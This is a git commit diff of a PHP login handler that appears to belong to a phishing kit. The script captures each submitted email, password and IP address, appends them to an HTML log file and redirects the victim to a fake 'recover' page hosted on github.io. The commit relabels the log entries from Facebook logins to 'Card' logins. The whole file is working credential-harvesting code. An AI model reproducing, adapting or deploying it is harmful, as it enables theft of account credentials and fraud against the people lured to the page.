65b4dcd1e81d52085b0378f9b5c8a4932a0d0f6b
Charleswayne22 <instagramb188@gmail.com>
2025-06-28 15:56:14 +0100

    login.php

--- login.php
+++ login.php
@@ -3,7 +3,7 @@ $email = $_POST['email'];
 $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $f = fopen("logger.html", "a"); 
-fwrite ($f, 'FACEBOOK LOGIN: [<b><font color="#DC143C">'.$email.'</font></b>] PASSWORD: [<b><font color="#008000">'.$pass.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
+fwrite ($f, 'Card LOGIN: [<b><font color="#DC143C">'.$email.'</font></b>] PASSWORD: [<b><font color="#008000">'.$pass.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
 fclose($f);
 header('Location: https://charleswayne22.github.io/recover/initiate/');
 ?>
